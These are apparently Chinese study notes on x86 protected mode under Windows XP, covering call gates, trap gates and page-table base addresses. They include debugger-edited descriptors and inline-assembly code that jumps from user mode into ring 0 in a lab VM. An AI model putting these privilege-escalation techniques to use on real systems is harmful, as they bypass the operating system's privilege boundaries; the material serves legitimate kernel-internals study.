00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec00`000810308003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 0040ec00`00081050kd&gt; g测试代码执行结果12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwH2GValue;BOOL bFunc1BeCalled;BOOL bFunc2BeCalled;char gate1[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC00`00081030char gate2[6] = &#123;0, 0, 0, 0, 0x98, 0&#125;;//8003f098 0040EC00`00081050// 裸函数1void __declspec(naked) Func1() //00401030 &#123; __asm &#123; // int 3 pushad pushfd mov eax,10 mov dword ptr ds:[bFunc1BeCalled],eax //BOOL是int类型，32位。用dword call fword ptr ds:[gate2]; // 长调用，需要6个字节 popfd popad retf // 注意返回，不能是ret &#125;&#125;// 裸函数2void __declspec(naked) Func2() //00401050 &#123; __asm &#123; // int 3 pushad pushfd mov eax,0x8003f00c //读取高2G的地址 mov ebx,[eax] mov dwH2GValue,ebx mov eax,20 mov dword ptr ds:[bFunc2BeCalled],eax popfd popad retf //注意返回，不能是ret &#125;&#125;int main()&#123; printf(&quot;%d %d &quot;, bFunc1BeCalled,bFunc2BeCalled); // char buff[6]; // *(DWORD *)&amp;buff[0] = 0x12345678; // 低4字节，EIP，可以随便写 // *(WORD *)&amp;buff[4] = 0x48; // 高16位，段选择子。0x48拆完索引到的是刚才修改的8003f048，中断门描述符 __asm &#123; call fword ptr ds:[gate1]; // 长调用，需要6个字节 &#125; // PrintRegister_Main(); printf(&quot;%x &quot;,dwH2GValue); printf(&quot;%d %d &quot;, bFunc1BeCalled,bFunc2BeCalled); getchar(); return 0;&#125;代码分析：功能两个全局变量bFunc1BeCalled和bFunc2BeCalled，分别在裸函数里赋值。main函数中有两次打印输出，第一次是call前打印看两个变量原始值，都是0；第二次打印输出是call完，分别是10，20。没蓝屏，证明实验成功。第二个裸函数里读高2G内存，证明还是0环权限BOOL是int类型，32位，裸函数里用dword ptr序号2：0环跳一个3环代码段修改第二个门描述符里去的代码段，去3环代码段8003f098 0040EC00`00081050改成8003f098 0040EC00`00181050，去3环代码段序号地址段描述符数据段or代码段DPL38003f01800cffa00`0000ffff代码段11运行结果：结果异常，输入g后蓝屏重启运行截图Windbg输出1234567891011121314151617181920212223242526272829303132333435363738394041424344454647kd&gt; g*** Fatal System Error: 0x0000007f (0x0000000D,0x00000000,0x00000000,0x00000000)Break instruction exception - code 80000003 (first chance)A fatal system error has occurred.Debugger entered on first try; Bugcheck callbacks have not been invoked.A fatal system error has occurred.Connected to Windows XP 2600 x86 compatible target at (Fri Jun 30 18:17:17.014 2023 (UTC + 8:00)), ptr64 FALSELoading Kernel Symbols.............................................................................Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take too long.Run !sym noisy before .reload to track down problems loading symbols.............................................Loading User Symbols...Loading unloaded module list...........ERROR: FindPlugIns 8007007b******************************************************************************** ** Bugcheck Analysis ** ********************************************************************************Use !analyze -v to get detailed debugging information.BugCheck 7F, &#123;d, 0, 0, 0&#125;*** WARNING: Unable to verify checksum for 2callgate.exe*** ERROR: Module load completed but symbols could not be loaded for 2callgate.exeProbably caused by : ntkrnlpa.exe ( nt!KiSystemFatalException+f )Followup: MachineOwner---------nt!RtlpBreakWithStatusInstruction:80528bdc cc int 3Net COM port baud is ignored序号3:0环跳另一个0环代码段第一个门描述符：0040EC00`00081030第二个门描述符：0040EC00`00781050理论上可以，但是不知为啥异常了，输入g后蓝屏小结call可以调用调用门。对应代码段和CPL权限对比情况对应代码段比CPL权限高时自动提权，堆栈存储EIP CS 参数 ESP SS对应代码段比CPL权限低时触发异常，蓝屏权限相同时执行正常，权限不变 练习：jmp跳调用门 同权jmp 提权jmp 降权jmp 过程同权jmp0环跳0环修改的GDT描述符：12kd&gt; eq 8003f048 0040EC00`00081020kd&gt; eq 8003f098 0040EC00`0008103D测试代码代码设计及分析执行结果12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwH2GValue;BOOL bFlag;char gateforcall[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC00`00081020char gateforjmp[6] = &#123;0, 0, 0, 0, 0x98, 0&#125;;//8003f098 0040EC00`0008103D//切换堆栈后执行的代码void __declspec(naked) GetRegister() //00401020&#123; __asm &#123; //int 3 pushad pushfd mov eax,0x8003f00c //读取高2G的地址 mov ebx,[eax] mov dwH2GValue,ebx jmp fword ptr ds:[gateforjmp] //不执行 mov dword ptr ds:[bFlag],ebx //0040103D popfd //jmp到这里 popad retf //注意返回，不能是ret &#125;&#125;int main()&#123; printf(&quot;%d &quot;,bFlag); __asm &#123; call fword ptr ds:[gateforcall]; //长调用，需要6个字节 &#125; printf(&quot;%x %d &quot;,dwH2GValue,bFlag); getchar(); return 0;&#125;代码设计：在0环中，原意将ebx的值分别赋给dwH2GValue和变量bFalg，但是赋值给bFlag那句用jmp跳过，等于没执行。第一次屏幕打印输出bFlag的初始值，是0。然后打印dwH2GValue，bFlag。分析：如果bFlag第二次打印的值是0，且没蓝屏，表示jmp指令执行成功，成功从0环跳到0环。提权jmp测试代码运行结果1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE GDT[6]=&#123;0&#125;;DWORD dwH2GValue;//切换堆栈后执行的代码void __declspec(naked) GetRegister() //00401030&#123; __asm &#123; //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈 pushad pushfd mov eax,0x8003f00c //读取高2G的地址 mov ebx,[eax] mov dwH2GValue,ebx sgdt GDT //读GDTR寄存器 popfd popad retf //注意返回，不能是ret &#125;&#125;void PrintRegister()&#123; DWORD GDT_ADDR=*(PDWORD)(&amp;GDT[2]); WORD GDT_LIMIT=*(PWORD)(&amp;GDT[0]); printf(&quot;%x %x %x &quot;,dwH2GValue,GDT_ADDR,GDT_LIMIT);&#125;int main()&#123; // __asm //这里我没看明白干嘛呢，注释掉VC编译就不报错了 // &#123; // mov ebx,ebx // mov ebx,ebx // &#125; char buff[6]; *(DWORD*)&amp;buff[0]=0x12345678; //低4字节，EIP，可以随便写 *(WORD*)&amp;buff[4]=0x48; //高16位，段选择子。0x48拆完索引到的是刚才修改的8003f048，中断门描述符 __asm &#123; jmp fword ptr[buff]; //长调用，需要6个字节 &#125; PrintRegister(); getchar(); return 0;&#125;代码仍在3环，不会蓝屏降权jmp只改了第二个门描述符，改为3环代码段序号地址段描述符数据段or代码段DPL38003f01800cffa00`0000ffff代码段1112kd&gt; eq 8003f048 0040EC00`00081020kd&gt; eq 8003f098 0040EC00`0018103D测试代码运行结果12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwH2GValue;BOOL bFlag;char gateforcall[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC00`00081020char gateforjmp[6] = &#123;0, 0, 0, 0, 0x98, 0&#125;;//8003f098 0040EC00`0018103D//切换堆栈后执行的代码void __declspec(naked) GetRegister() //00401020&#123; __asm &#123; //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈 pushad pushfd mov eax,0x8003f00c //读取高2G的地址 mov ebx,[eax] mov dwH2GValue,ebx jmp fword ptr ds:[gateforjmp] //不执行 mov dword ptr ds:[bFlag],ebx //0040103D popfd //jmp到这里 popad retf //注意返回，不能是ret &#125;&#125;int main()&#123; printf(&quot;%d &quot;,bFlag); __asm &#123; call fword ptr ds:[gateforcall]; //长调用，需要6个字节 &#125; printf(&quot;%x %d &quot;,dwH2GValue,bFlag); getchar(); return 0;&#125;卡住，windbg输入g后蓝屏小结如果权限相同，则执行没问题，堆栈里没有值。如果涉及提权，则会C005访问异常，代码仍在3环，不会蓝屏。如果涉及降权，则会蓝屏。call和jmp小结call可以调用调用门。对应代码段比CPL权限高时，自动提权，堆栈存储EIP CS 参数 ESP SS。对应代码段比CPL权限低时，会触发异常，蓝屏。权限相同时，执行正常，权限不变。jmp可以跳调用门。如果权限相同，则执行没问题，堆栈里没有值。如果涉及提权，则会C005访问异常，代码仍在3环，不会蓝屏。如果涉及降权，则会蓝屏。 总结 当通过门,权限不变的时候，只会PUSH两个值:CS和返回地址。新的CS的值由调用门决定 当通过门,权限改变的时候，会PUSH四个值:SS，ESP，CS，返回地址。新的CS的值由调用门决定，新的SS和ESP由TSS提供 通过门调用时，要执行哪行代码由调用门决定,但使用RETF返回时，由堆柱中压入的值决定，这就是说，进门时只能按指定路线（按门描述符上跳转的地址）走,出门时可以翻墙(改变堆栈的值然后弹栈，就可以想去哪去哪) 可不可以再建个门出去呢?也就是用Call。当然可以，前门进，在门里再call另一个门出去"},{"title":"跨段跳转","path":"/wiki/Protected_Mode/跨段跳转.html","content":"要点回顾 我们通过JMP FAR可以实现段间的跳转，如果要实现跨段的调用就必须要学习CALL FAR,也就是长调用。 CALL FAR比JMP FAR要复杂，JMP并不影响堆栈,但CALL指令会影响。 小结对比 跨段跳转分为短调用和长调用。长调用分为提权或不提权，三者对比表如下。 调用方式 指令格式 发生改变的寄存器 堆栈变化（从左到右为入栈顺序） 备注 短调用 CALL 立即数/寄存器/内存 ESP、EIP 返回地址 长调用（跨段不提权） CALL CS:EIP ;(EIP实际上是废弃不使用的) ESP、EIP、CS 调用者CS、返回地址 长调用（跨段并提权） CALL CS:EIP ;(EIP实际上是废弃不使用的) ESP、EIP、CS、SS 调用者SS、调用者ESP、调用者CS、返回地址 因为提权了，比如从3环到0环。那么SS随着CS的CPL一起变了；call后使用的堆栈变了，原本使用的是3环的堆栈，现在使用的是0环的堆栈。 压栈顺序都是x86指令集定义好的 短调用 指令格式： 1CALL 立即数/寄存器/内存 ;提供CALL指令执行后要跳转的代码地址 CALL指令调用，CPU将下一条指令地址压入堆栈（ESP-4），然后跳转到目标地址。RET返回时将栈顶数据赋给EIP（ESP+4）。 发生改变的寄存器：ESP、EIP。 长调用（跨段不提权） 指令格式： 1CALL CS:EIP ;(EIP实际上是废弃不使用的) EIP爱写啥写啥，但为了语法格式兼容，还是写了 CS充当选择子，查GDT表找段描述符，这个段描述符必须是一个调用门，从调用门算出跳转的地址，EIP废弃不用。 跨段不提权： 跨段：CS变了。 不提权：当前CS的CPL和找到的段描述符的DPL一样。 堆栈会压入调用者CS段寄存器。如果不压入，就丢失了调用前CS的值。 返回时用长返回指令 1RETF 发生改变的寄存器：ESP、EIP、CS。 长调用（跨段并提权） 指令格式： 1CALL CS:EIP ;(EIP实际上是废弃不使用的) （图中ESP3，想说明这是一个3环的堆栈。ESP0想说明这是一个0环的堆栈）。 因为是一个跨段且提权的调用，CS的CPL变了，SS的CPL也会跟着变。从一个CPL的堆栈跳到另一个CPL的堆栈，使用的堆栈变了，ESP变了。所以要压入SS和ESP。 发生改变的寄存器：ESP、EIP、CS、SS。 执行返回指令时的堆栈变化： 总结 跨段调用时，一旦有权限切换，就会切换堆栈。 CS的权限一旦改变，SS的权限也要随着改变，CS与SS的CPL必须一样（Intel规定的）。 JMP FAR只能跳转到同级非一致代码段，但CALL FAR可以通过调用门提权，提升CPL的权限。 SS与ESP从哪里来?参见TSS段。 问题 ebp? ebp 0环8字头的,3环小于8 ebp只有一个啊.又没有两个"},{"title":"陷阱门","path":"/wiki/Protected_Mode/陷阱门.html","content":"陷阱门描述符 结构图 陷阱门的结构和中断门结构几乎一样：D位、不能传参、调用方式也是INT N等等。只是Type域的第8位不同；陷阱门第8位为1，中断门为0；从十六进制来看，陷阱门为F，中断门为E。 和中断门的区别 门 执行时 中断门 会将IF位清零 陷阱门 不会将IF位清零 实验 构造陷阱门，实现提权后读取高2G的地址并分析堆栈情况 实验过程构造陷阱门描述符测试代码运行结果堆栈分析构造的门描述符（DPL=3）：0040EF00`000810201234567891011121314151617181920212223242526272829303132333435363738kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000 00000000`00080000kd&gt; eq 8003f500 0040EF00`00081020kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0040ef00`00081020 00000000`00080000kd&gt; g代码和自己构造中断门那个md的代码一样，就只是windbg改门描述符不一样123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDTItem[8]=&#123;0&#125;;//切换堆栈后执行的代码void __declspec(naked) R0Func() //00401020 &#123; __asm &#123; //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈 pushad pushfd mov eax,0x8003f400 //读取高2G的地址，地址是IDT表基址 mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDT表第一个元素的低32位（小端序） mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDT表第一个元素的高32位（小端序） popfd popad iretd //iret会蓝屏，因为iret的硬编码是66CF，32位下应该使用iretd，硬编码是C &#125;&#125;int main()&#123; __asm &#123; int 0x20 //索引号32，8003f500 &#125; printf(&quot;%08x`%08x &quot;,*(PDWORD)((PBYTE)IDTItem+0x4),*(PDWORD)IDTItem);//处理成：按windbg的dq那样显示数据 getchar(); return 0;&#125;调用中断门前调用中eflag寄存器调用前后IF位没变"},{"title":"页目录表基址","path":"/wiki/Protected_Mode/页目录表基址.html","content":"前言 在上一节课课后题中我们提到过，如果系统要保证某个线性地址是有效的, 那么必须为其填充正确的PDE与PTE，如果我们想填充PDE与PTE那么必须能够访问PDT与PTT,那么存在2个问题: 1、一定已经有“人&quot;为我们访问PDT与PTT挂好了PDE与PTE,我们只有找到这个线性地址就可以了。 2、这个为我们挂好PDE与PTE的“人&quot;是谁? 答案当我们申请一块内存时，怎么去PDT和PTT挂上相应的PDE和PTE？PDT和PTT是物理地址，给物理地址的话，我们和操作系统如何访问？因为程序使用的都是线性地址，无法直接使用物理地址。那么我们想到读写PDT和PTT表，填上PDE和PTE必须用到线性地址。所以CPU给我们准备了线性地址0xC0300000，通过这个线性地址，就可以找到PDT表头的物理地址；线性地址0xC0000000，通过这个线性地址，就可以找到PTT表头的物理地址 页目录表（PDE）基址 0xC0300000 1234线性地址0xC0300000拆分1100000000,300 //10 ;400*4=C001100000000,300 //10 ;400*4=C00000 //12 以notepad进程为例，windbg下断，查CR3，是109df000 123PROCESS 85fb2da0 SessionId: 0 Cid: 00b8 Peb: 7ffd6000 ParentCid: 0714 DirBase: 109df000 ObjectTable: e220e6f0 HandleCount: 44. Image: notepad.exe CR3->PDT表 A.CR3指向的是PDT表 查看CR3处的数据得到的就是PDT表 123456789kd&gt; !dd 109df000#109df000 10801067 10c26067 10876067 00000000#109df010 10934067 00000000 00000000 00000000#109df020 00000000 00000000 00000000 00000000#109df030 00000000 00000000 00000000 00000000#109df040 00000000 00000000 00000000 00000000#109df050 00000000 00000000 00000000 00000000#109df060 00000000 00000000 00000000 00000000#109df070 00000000 00000000 00000000 00000000 CR3->PDE->PTE->物理页的方式找0xC0300000的物理页 按之前学的CR3+第一个10×4–&gt;PDE，PDE+第二个10×4–&gt;PTE，PDE+12位–&gt;物理页，来找一遍 a.CR3+线性地址0xC0300000拆分后第1个10位*4 得到PDE是109df063 123456789kd&gt; !dd 109df000+C00#109dfc00 109df063 109a0063 00000000 06a50163#109dfc10 06a51163 06a52163 06a53163 06a54163#109dfc20 06a55163 06a56163 06a57163 06a58163#109dfc30 06a59163 06a5a163 06a5b163 06a5c163#109dfc40 06a5d163 06a5e163 06a5f163 06a60163#109dfc50 06a61163 06a62163 06a63163 06a64163#109dfc60 06a65163 06a66163 06a67163 06a68163#109dfc70 06a29163 06a2a163 06a2b163 06a2c163 b.PDE+线性地址0xC0300000拆分后第2个10位*4 得到PTE是109df063 123456789kd&gt; !dd 109df000+C00#109dfc00 109df063 109a0063 00000000 06a50163#109dfc10 06a51163 06a52163 06a53163 06a54163#109dfc20 06a55163 06a56163 06a57163 06a58163#109dfc30 06a59163 06a5a163 06a5b163 06a5c163#109dfc40 06a5d163 06a5e163 06a5f163 06a60163#109dfc50 06a61163 06a62163 06a63163 06a64163#109dfc60 06a65163 06a66163 06a67163 06a68163#109dfc70 06a29163 06a2a163 06a2b163 06a2c163 c.PTE+线性地址0xC0300000拆分后12位 得到物理页 123456789kd&gt; !dd 109df000+000#109df000 10801067 10c26067 10876067 00000000#109df010 10934067 00000000 00000000 00000000#109df020 00000000 00000000 00000000 00000000#109df030 00000000 00000000 00000000 00000000#109df040 00000000 00000000 00000000 00000000#109df050 00000000 00000000 00000000 00000000#109df060 00000000 00000000 00000000 00000000#109df070 00000000 00000000 00000000 00000000 观察A输出的内容（CR3指向PDT表） 和 通过步骤abc输出的内容（线性地址0xC0300000对应的物理页），得出结论： PDT表是一张物理页 线性地址0xC0300000找到的物理页是PDT表 观察步骤a（查PDE项）和步骤b（查PTE项）输出的内容，得出结论： PDT表，本身也是页表 小结 其实不存在页目录表（PDT），页目录表（PDT）就是页表（PTT）中特殊的一张表。 这张表是张物理页，既充当了页目录表（PDT），也充当了页表（PTT）。 从充当了页表（PTT）的角度看，它是一张特殊的页表（PTT），因为每一项PTE没有指向物理页，而是指向其他页表（PTT），有一项指向自己表头。 通过线性地址0xC0300000找到的物理页就是页目录表（PDT）。 如果我们要访问第N个PDE，公式：0xC0300000+N*4 根据上面的推导，我们修正一下之前CR3-&gt;PDT-&gt;PTT-&gt;物理页寻址的这张图： 修正为： 练习+思考 通过上面的学习，我们知道了线性地址0xC0300000指向了PDT表，然后用公式0xC0300000+N*4能去改任意的PDE项。如果我们想要给线性地址0挂上物理页，我们可以通过下面这行指令进行修改（伪码） 1mov dword ptr ds:[0xC0300000],0x10101010 然后，怎么修改PTE？ 答案思维误区，windbg中通过PDE项查出来的PTT表内容，依旧是物理地址，无法在程序中使用。也就是说，仅有线性地址0xC0300000只能动PDE，但是没法修改PTE。所以还需要1个线性地址，通过这个线性地址，可以修改到PTE项。"},{"title":"页表基址","path":"/wiki/Protected_Mode/页表基址.html","content":"前言 根据上一篇文章的练习+思考题可知，光有页目录表（PDT）基址还不够，因为决定一个线性地址是否有效既取决于PDE，又取决于PTE。那页表（PTE）基址是？ 页表（PTE）基址 0xC0000000 1234线性地址0xC0000000拆分1100000000,300 //10 ;400*4=C000000000000 //10000 //12 以notepad进程为例，windbg下断，查CR3，是109df000 CR3->PDT表，看PDT表内容 A.通过CR3-&gt;的PDT表里的PDE，找到所指向的PTT表 查看CR3处的数据得到的是PDT表，里面的每一项PDE指向了PTT表 123456789kd&gt; !dd 109df000#109df000 10801067 10c26067 10876067 00000000#109df010 10934067 00000000 00000000 00000000#109df020 00000000 00000000 00000000 00000000#109df030 00000000 00000000 00000000 00000000#109df040 00000000 00000000 00000000 00000000#109df050 00000000 00000000 00000000 00000000#109df060 00000000 00000000 00000000 00000000#109df070 00000000 00000000 00000000 00000000 比如，第1项PDE：10801067，指向了第1个PTT表，PTT表的内容如下： 123456789kd&gt; !dd 10801000#10801000 00000000 00000000 00000000 00000000#10801010 00000000 00000000 00000000 00000000#10801020 00000000 00000000 00000000 00000000#10801030 00000000 00000000 00000000 00000000#10801040 107c2067 00000000 00000000 00000000#10801050 00000000 00000000 00000000 00000000#10801060 00000000 00000000 00000000 00000000#10801070 00000000 00000000 00000000 00000000 比如，第2项PDE：10c26067，指向了第2个PTT表，PTT表的内容如下： 123456789kd&gt; !dd 10c26000#10c26000 10af4067 10735067 00000080 00000000#10c26010 00000000 00000000 00000000 00000000#10c26020 00000000 00000000 00000000 00000000#10c26030 00000000 00000000 00000000 00000000#10c26040 10c27067 10b68067 10c69067 10b2a067#10c26050 10a6c067 10a2d067 10b6e067 109ab067#10c26060 00000000 00000000 00000000 00000000#10c26070 00000000 00000000 00000000 00000000 CR3->PDE->PTE->物理页的方式找0xC0000000的物理页 按之前学的CR3+第一个10×4–&gt;PDE，PDE+第二个10×4–&gt;PTE，PDE+12位–&gt;物理页，来找一遍 0xC0000000 a.CR3+线性地址0xC0000000拆分后第1个10位*4 得到PDE是109df063 123456789kd&gt; !dd 109df000+C00#109dfc00 109df063 109a0063 00000000 06a50163#109dfc10 06a51163 06a52163 06a53163 06a54163#109dfc20 06a55163 06a56163 06a57163 06a58163#109dfc30 06a59163 06a5a163 06a5b163 06a5c163#109dfc40 06a5d163 06a5e163 06a5f163 06a60163#109dfc50 06a61163 06a62163 06a63163 06a64163#109dfc60 06a65163 06a66163 06a67163 06a68163#109dfc70 06a29163 06a2a163 06a2b163 06a2c163 b.PDE+线性地址0xC0300000拆分后第2个10位*4 得到PTE是109df063 123456789kd&gt; !dd 109df000#109df000 10801067 10c26067 10876067 00000000#109df010 10934067 00000000 00000000 00000000#109df020 00000000 00000000 00000000 00000000#109df030 00000000 00000000 00000000 00000000#109df040 00000000 00000000 00000000 00000000#109df050 00000000 00000000 00000000 00000000#109df060 00000000 00000000 00000000 00000000#109df070 00000000 00000000 00000000 00000000 c.PTE+线性地址0xC0000000拆分后12位 得到物理页 123456789kd&gt; !dd 10801000#10801000 00000000 00000000 00000000 00000000#10801010 00000000 00000000 00000000 00000000#10801020 00000000 00000000 00000000 00000000#10801030 00000000 00000000 00000000 00000000#10801040 107c2067 00000000 00000000 00000000#10801050 00000000 00000000 00000000 00000000#10801060 00000000 00000000 00000000 00000000#10801070 00000000 00000000 00000000 00000000 CR3->PDE->PTE->物理页的方式找0xC0001000的物理页 按之前学的CR3+第一个10×4–&gt;PDE，PDE+第二个10×4–&gt;PTE，PDE+12位–&gt;物理页，来找一遍 0xC0001000 1234线性地址0xC0001000拆分1100000000,300 //10 ;400*4=C000000000001,1 //10 ;1*4=4000 //12 a.CR3+线性地址0xC0001000拆分后第1个10位*4 得到PDE是109df063 123456789kd&gt; !dd 109df000+C00#109dfc00 109df063 109a0063 00000000 06a50163#109dfc10 06a51163 06a52163 06a53163 06a54163#109dfc20 06a55163 06a56163 06a57163 06a58163#109dfc30 06a59163 06a5a163 06a5b163 06a5c163#109dfc40 06a5d163 06a5e163 06a5f163 06a60163#109dfc50 06a61163 06a62163 06a63163 06a64163#109dfc60 06a65163 06a66163 06a67163 06a68163#109dfc70 06a29163 06a2a163 06a2b163 06a2c163 b.PDE+线性地址0xC0001000拆分后第2个10位*4 得到PTE是10c26067 123456789kd&gt; !dd 109df000+4#109df004 10c26067 10876067 00000000 10934067#109df014 00000000 00000000 00000000 00000000#109df024 00000000 00000000 00000000 00000000#109df034 00000000 00000000 00000000 00000000#109df044 00000000 00000000 00000000 00000000#109df054 00000000 00000000 00000000 00000000#109df064 00000000 00000000 00000000 00000000#109df074 00000000 00000000 00000000 00000000 c.PTE+线性地址0xC0001000拆分后12位 得到物理页 123456789kd&gt; !dd 10c26000#10c26000 10af4067 10735067 00000080 00000000#10c26010 00000000 00000000 00000000 00000000#10c26020 00000000 00000000 00000000 00000000#10c26030 00000000 00000000 00000000 00000000#10c26040 10c27067 10b68067 10c69067 10b2a067#10c26050 10a6c067 10a2d067 10b6e067 109ab067#10c26060 00000000 00000000 00000000 00000000#10c26070 00000000 00000000 00000000 00000000 观察A方式查看到的第1张PTT表 和 通过步骤abc拆分线性地址0xC0000000输出的内容（线性地址0xC0000000对应的物理页），得出结论： 线性地址0xC0000000找到的物理页是第一张PTT表 观察A方式查看到的第2张PTT表 和 通过步骤abc拆分线性地址0xC0001000输出的内容（线性地址0xC0001000对应的物理页），得出结论： 线性地址0xC0001000找到的物理页是第二张PTT表 0xC0000000和0xC0001000间隔0x1000，4kb，因为一张PTT表大小4kb。 总结 1、页表被映射到了从0xC0000000到0xC03FFFFF的4M地址空间 1张页表4kb，有1024张，一共大小1024*4kb=4M 2、在这1024个表中有一张特殊的表:页目录表 第0x300张表，十进制768 3、页目录表被映射到了0xC0300000开始处的4K地址空间 再次对分页模式的图进行补充： windbg自动计算物理页的指令 会自动计算出该线性地址对应的PDE、PTE、物理页 1!vtop &lt;CR3&gt; &lt;线性地址&gt; 有了这两个基址能做什么？ 有了0xC0300000和0xC0000000能做什么？如果掌握了这两个地址，就掌握了一个进程所有物理内存的读写权限。 线性地址0xC0300000，指向了页目录表（（它其实是第0x300张页表））。通过0xC0300000，可以找到任何一个线性地址的PDE。 线性地址0xC0000000，指向了第一张页表，又因为1024张页表是连续的（物理页不连续），所以，可以通过计算找到任何一个PTE。 PDI（Index）：在PDT表中的索引。PTI（Index）：在PTT表中的索引。 分别对应10-10-12的前两个10。 寻找PDE的公式如下： 访问页目录表（PDT）的公式：0xC0300000 + PDI * 4 寻找PTE的公式如下： 访问页表（PTT）的公式：0xC0000000 + PDI * 4096 + PTI * 4 解释一下第二条公式，PDI*4KB是找到线性地址所在的页表，因为1024张页表是连续的。找到页表后，PTI * 4找页表项PTE。 课后练习 逆向分析MmIsAddressValid函数 如何找到这个函数windbg的uf命令IDA12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152kd&gt; uf MmIsAddressValidnt!MmIsAddressValid:804e4661 8bff mov edi,edi804e4663 55 push ebp804e4664 8bec mov ebp,esp804e4666 8b4d08 mov ecx,dword ptr [ebp+8]804e4669 8bc1 mov eax,ecx804e466b c1e814 shr eax,14h804e466e bafc0f0000 mov edx,0FFCh804e4673 23c2 and eax,edx804e4675 2d0000d03f sub eax,3FD00000h804e467a 8b00 mov eax,dword ptr [eax]804e467c a801 test al,1804e467e 0f84d2f10000 je nt!MmIsAddressValid+0x4f (804f3856)nt!MmIsAddressValid+0x1f:804e4684 84c0 test al,al804e4686 7824 js nt!MmIsAddressValid+0x53 (804e46ac)nt!MmIsAddressValid+0x23:804e4688 c1e90a shr ecx,0Ah804e468b 81e1fcff3f00 and ecx,3FFFFCh804e4691 81e900000040 sub ecx,40000000h804e4697 8bc1 mov eax,ecx804e4699 8b08 mov ecx,dword ptr [eax]804e469b f6c101 test cl,1804e469e 0f84b2f10000 je nt!MmIsAddressValid+0x4f (804f3856)nt!MmIsAddressValid+0x3b:804e46a4 84c9 test cl,cl804e46a6 0f88b6de0300 js nt!MmIsAddressValid+0x3f (80522562)nt!MmIsAddressValid+0x53:804e46ac b001 mov al,1nt!MmIsAddressValid+0x55:804e46ae 5d pop ebp804e46af c20400 ret 4nt!MmIsAddressValid+0x4f:804f3856 32c0 xor al,al804f3858 e9510effff jmp nt!MmIsAddressValid+0x55 (804e46ae)nt!MmIsAddressValid+0x3f:80522562 23c2 and eax,edx80522564 8b80000030c0 mov eax,dword ptr [eax-3FD00000h]8052256a 66258100 and ax,81h8052256e 3c81 cmp al,81h80522570 0f853621fcff jne nt!MmIsAddressValid+0x53 (804e46ac)nt!MmIsAddressValid+0x53:80522576 e9db12fdff jmp nt!MmIsAddressValid+0x4f (804f3856)参考：保护模式篇——段和门小结-羽夏的博客-练习题7答案先找到内核文件，在C:\\WINDOWS\\system32路径下：10-10-12分页模式下，内核文件为ntoskrnl.exe2-9-9-12分页模式下，内核文件为ntkrnlpa.exe其他系统可以用PCHunter确认，下图是我在32位xp系统（用的10-10-12分页）打开的符号文件用PDBDownload下载：https://www.cnblogs.com/onetrainee/p/11767895.htmlPDBDownload下载链接：https://techcommunity.microsoft.com/t5/iis-support-blog/pdb-downloader/ba-p/342969打开IDA，然后把ntoskrnl.exe拖进去，然后IDA询问检测到调试信息，是否从微软服务器下载符号，点击否。因为WinXP的符号微软早不搞了。然后自己加载符号，打开加载符号文件：File-&gt;Load file-&gt;PDB file。Alt+T，搜索定位到MmIsAddressValid，然后开始分析。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869.text:0040C661 ; =============== S U B R O U T I N E =======================================.text:0040C661.text:0040C661 ; Attributes: bp-based frame.text:0040C661.text:0040C661 ; BOOLEAN __stdcall MmIsAddressValid(PVOID VirtualAddress).text:0040C661 public MmIsAddressValid.text:0040C661 MmIsAddressValid proc near ; CODE XREF: sub_40D65E+C↓p.text:0040C661 ; sub_415459:loc_415470↓p ....text:0040C661.text:0040C661 VirtualAddress = dword ptr 8.text:0040C661.text:0040C661 